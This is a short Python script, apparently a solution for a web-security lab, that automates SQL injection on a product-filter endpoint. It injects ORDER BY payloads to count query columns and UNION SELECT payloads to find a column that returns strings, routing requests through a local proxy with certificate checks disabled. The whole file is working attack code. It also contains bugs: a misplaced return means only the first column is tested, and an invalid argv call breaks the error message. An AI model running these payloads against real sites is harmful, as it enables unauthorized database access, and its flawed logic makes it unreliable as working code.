import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def get_no_column(url):
    path = "/filter?category=Accessories"
    columnNo = 1
    finalColumnNo = 0;
    payload = "' ORDER BY "         # final payload = select a,b from table ORDER BY 1
    while(columnNo != 0):
        res = requests.get(url+path+payload+str(columnNo)+"--", verify=False, proxies=proxies)

        if(res.status_code == 200):
            finalColumnNo = columnNo
            columnNo += 1
        else:
            columnNo = 0

    if(finalColumnNo != 0):
        return finalColumnNo
    else:
        return 0
    
def get_String_column(url, noOfColumn):
   path = "/filter?category=Accessories"
   string = "'dMTt7j'" 

   for i in range(1,noOfColumn+1):
       payload_list = ['null'] * noOfColumn
       payload_list[i-1] =  string
       sql_payload = "' UNION SELECT " + ','.join(payload_list) + "--"

       res = requests.get(url+path+sql_payload, verify= False, proxies=proxies)

       if(string.strip("'") in res.text):
        return i
       
       return False
        

proxies = {
    'http' : 'http://127.0.0.1:8080',
    'https' : 'http://127.0.0.1:8080'
}

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        
    except IndexError:
        print("[-] %s input invalid" %sys.argv(0) )

    noOfColumn = get_no_column(url)
    print(noOfColumn)

    stringContainingColumn = get_String_column(url, noOfColumn) 

    if(stringContainingColumn):
        print ("column no " + str(stringContainingColumn) + " contain the string type")
    else:
        print ("no column has string type")
